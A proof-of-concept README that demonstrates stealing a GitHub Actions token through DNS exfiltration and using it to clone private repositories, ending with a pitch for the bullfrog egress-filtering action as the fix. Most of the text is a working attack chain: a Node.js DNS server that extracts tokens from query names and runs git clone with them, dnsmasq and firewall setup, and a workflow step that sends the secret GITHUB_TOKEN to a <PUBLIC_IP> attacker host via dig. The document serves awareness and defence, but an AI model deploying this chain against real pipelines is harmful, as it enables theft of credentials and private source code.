# Unauthorized clone of private repos using DNS exfiltration

This repository demonstrates a proof-of-concept for cloning private GitHub repositories using DNS exfiltration, highlighting a potential security risk within GitHub Actions workflows.

## :warning: Disclaimer

The information provided in this article is intended solely for educational purposes and to raise awareness about potential security vulnerabilities. The techniques demonstrated here, including DNS exfiltration in a GitHub Actions workflow, are meant to help developers and security professionals understand and defend against such threats. Unauthorized hacking, data exfiltration, and any form of cyberattack are illegal and unethical. Always use your knowledge responsibly and adhere to all applicable laws and regulations. The author and publisher of this article do not condone or encourage any malicious activity and are not responsible for any misuse of the information presented.

## Setup the DNS server

### Get a server that can be accessed publicly

We recommend that you use an ephemeral VM for this, as we will modify the local DNS resolver and this could mess up with your server's ability to resolve IP addresses and access local or remote services if not correctly configured.

For this POC we are using an AWS EC2 instance using Ubuntu. After launching your Ubuntu instance, SSH into it and install a few software that we need to run our DNS server.

```bash
sudo apt-get update && \
sudo apt-get install -y dnsmasq nodejs npm net-tools git
```

### Create a custom DNS server

We'll use nodejs to create a custom DNS server which will extract the Github Token from the DNS query.

First setup the project folder and install [native-dns](https://www.npmjs.com/package/native-dns):

```bash
mkdir dnsx
cd dnsx
npm init -y
npm install native-dns
```

Now create a file named `dns.js` with the content below:

```js {filename="dns.js"}
const dns = require("native-dns");
const server = dns.createServer();
const util = require("node:util");
const { exec: execCb } = require("node:child_process");
const exec = util.promisify(execCb);

function dnsResponse(name) {
  return dns.A({
    name,
    address: "10.0.0.1", //this IP address is non-consequential, it could be anything
    ttl: 60,
  });
}

server.on("request", (request, response) => {
  request.question.forEach((question) => {
    console.log("DNS Question:", question);
    if (question.name === "test.dnsx.github.com") {
      response.answer.push(dnsResponse(question.name));
      response.send();
      return;
    }

    const [owner, repo, token] = question.name.split(".").slice(0, 3);
    if (!token || !["ghs", "ghp"].includes(token.slice(0, 3))) {
      console.error("Invalid token:", token);
      response.answer.push(dnsResponse(question.name));
      response.send();
      return;
    }

    fullRepo = `${owner}/${repo}`;
    console.log(`Repo: ${fullRepo}, Token: ${token}`);
    exec(`git clone https://thanks:${token}@github.com/${fullRepo}.git`).catch(
      (err) => {
        console.error("Error:", err);
      }
    );
    response.answer.push(dnsResponse(question.name));
    response.send();
  });
});

server.on("error", (err) => {
  console.error("Server error:", err);
});

console.log("serving on 5353");

server.serve(5353);
```

Now run the server:

```bash
node dns.js
```

You should now see `serving on 5353` in your console. You can test that your DNS server is responding to DNS queries using dig:

```bash
dig @127.0.0.1 -p 5353 test.dnsx.github.com
```

The DNS response should be an A record with IP 10.0.0.1.

If you look closely at the code from the custom nodejs DNS server, you can notice that we're expecting to receive DNS queries with the following format `<GITHUB_OWNER>.<GITHUB_REPO>.<GITHUB_TOKEN>.dnsx.github.com`. Upong receiving the DNS query, the values are extracted from the domain name in the DNS query and immediately the Github repository is cloned.

### Configure dnsmasq

The default DNS resolver on Ubuntu is systemd-resolved, but it lacks some features, like forwarding DNS queries to a different name server for a specific domain. We'll replace our local DNS resolver with dnsmasq, which provides more flexibility. We'll configure dnsmasq to use our custom DNS server for DNS queries to domain `dnsx.github.com` and use 8.8.8.8 (Google's DNS) for every other domains.

Open `/etc/dnsmasq.conf` and set the following config:

```{filename="/etc/dnsmasq.conf"}
server=/dnsx.github.com/127.0.0.1#5353
server=/#/8.8.8.8
interface=lo
interface=ens5 # replace with your network interface that will receive public request
```

The second `interface` in the dnsmasq.conf file is important. You need to make sure the network interface which will receive DNS queries from the internet is added here. On AWS, the network interface is `ens5`, but a common one is `eth0`. You can get the default network interface with the following command:

```bash
ip route | grep default | awk '{print $5}'
```

Now disable systemd-resolved and configure the system to use dnsmasq as the DNS resolver.

```bash
sudo systemctl disable --now systemd-resolved
```

Open `/etc/resolv.conf` and set the following config:

```{filename="/etc/resolv.conf"}
nameserver 127.0.0.1
```

Finally, restart the dnsmasq service

```bash
sudo systemctl restart dnsmasq
```

Confirm the setup by sending a DNS query to our default DNS server on port 53 (default port):

```bash
dig test.dnsx.github.com
```

Again, the DNS response should be an A record with IP 10.0.0.1.

### Test from the public internet

The test above only verified that the DNS server is properly configured on the localhost. Let's validate the setup is working fine when sending DNS queries from the public internet.

First, make sure the server has a public IP address and has opened the port 53.

On AWS, this can be done by adding the following inbound rules to the security group attached to the EC2 instance:

- DNS (TCP), Port 53, Source 0.0.0.0/0
- DNS (UDP), Port 53, Source 0.0.0.0/0

Now, from another machine, send a DNS query to your DNS server public IP address:

```bash
dig @<PUBLIC_IP> test.dnsx.github.com
```

Again, the DNS response should be an A record with IP 10.0.0.1.

### Using the public internet DNS resolution

Instead of specifying the custom DNS server IP address as the name server to use for the `dig` command, you can also use a real domain that you own and configure the `NS` record to point to your custom DNS server. Obviously, we won't be able to use the domain `dnsx.github.com` we've been using above, since we don't control the github.com domain, so we would need to use a domain that we own and control the DNS records. For example, if you own the `example.com` domain, you could configure the following DNS records in your domain DNS configuration (e.g. in AWS Route 53 or Cloudflare DNS):

- Add an `A` record for `ns.example.com` that resolves to your custom DNS server public IP address
- Add a `NS` record for `dnsx.example.com` with `ns.example.com` as the value

Now, from any machine, you can send a DNS query to your domain, without specifying the custom DNS server IP address, but still have it resolved by your custom DNS server:

```bash
dig test.dnsx.example.com
```

Of coursse, you would also need to modify the dnsmasq configuration and the code of the custom DNS server to respond to your domain (e.g. `dnxs.example.com` instead of `dnsx.github.com`):

## Exfiltrating Github Token via DNS

If you are familiar with Github Actions, you probably know that Github Actions workflows are running with a default Github token, which provides by default read permissions on the repository where the workflow is running, and can even have write permissions if the workflow is configured as such (or even run with Personal Access Token that a developer would have configured). Default workflow Github tokens are short-lived and will only live for the duration of the workflow.

For this proof-of-concept, we are particularly interested in private repositories. Malicious code which will exfiltrate data could be running from compromised third-party packages or Github Actions. For the purpose of this proof-of-concept, we'll assume that a private repository is running a compromised third-party action, which is configured to use the default Github token as an input, making the Github token (with repo read access) available for the code running in the action.

To simplify this proof-of-concept, we'll simply run the following workflow in the private repository that we are targeting, which will make a DNS query using `dig`:

```yml
name: DNS Exfiltration

on:
  push:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: |
          repo=$(echo ${{ github.repository }}  | cut -d'/' -f2)
          dig @<PUBLIC_IP> ${{ github.repository_owner}}.$repo.${{ secrets.GITHUB_TOKEN}}.dnsx.github.com
```

Replace `<PUBLIC_IP>` with the public IP address of your DNS server and run the workflow above. You should see the private repo being cloned on the server where the custom DNS server is running. A short-lived and ephemeral access token couldn't prevent against DNS exfiltration.

## Protecting Against DNS Exfiltration

Traditional security solutions that provide egress filtering will require you to allow or block specific IP addresses or IP ranges. Given the highly dynamic nature of IP addresses for most cloud services, this unfortunately doesn't meet most teams and organizations needs. There are some more sophisticated security solutions that allow you to filter based on domain names. Unfortunately, some of them do not provide the necessary protection against DNS exfiltration. The problem is that they allow all DNS queries and only block traditional TCP/UDP connections to IP addresses of domains that are not allowed, but in the case of DNS exfiltration, the harm has already been done during the IP resolution.

Solutions like [bullfrog](https://github.com/bullfrogsec/bullfrog) are purpose-built for providing egress filtering capabilities in Github Actions workflow and can effectively protect against DNS exfiltration. To block DNS exfiltration in our POC workflow, we add a step at the beginning of the job that use the [bullfrog Github Action](https://github.com/bullfrogsec/bullfrog):

```yml {hl_lines=[10,11,12,13,14,15]}
name: DNS Exfiltration

on:
  push:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Egress filtering
        uses: bullfrogsec/bullfrog@v0
        with:
          egress-policy: block
          allowed-domains: |
            *.github.com
      - run: |
          repo=$(echo ${{ github.repository }}  | cut -d'/' -f2)
          dig @<PUBLIC_IP> ${{ github.repository_owner}}.$repo.${{ secrets.GITHUB_TOKEN}}.dnsx.github.com
```

If you run the example workflow above, you should see the DNS query for the `dnsx.github.com` domain being blocked (in the workflow annotations) and you won't see the DNS query being received by your custom DNS server. Even with the `*.github.com` domains being allowed in bullfrog, the query is blocked because the specified name server is not trusted.

![block annotations for DNS queries](block-annotations.png)

## Conclusion

DNS exfiltration poses a significant threat to the security of private repositories, especially within automated CI/CD pipelines like GitHub Actions. This proof-of-concept underscores the importance of implementing robust security measures to prevent unauthorized access and data leakage. By leveraging [egress filtering solutions](https://github.com/bullfrogsec/bullfrog) and staying vigilant about third-party dependencies, developers can mitigate the risks associated with DNS exfiltration.
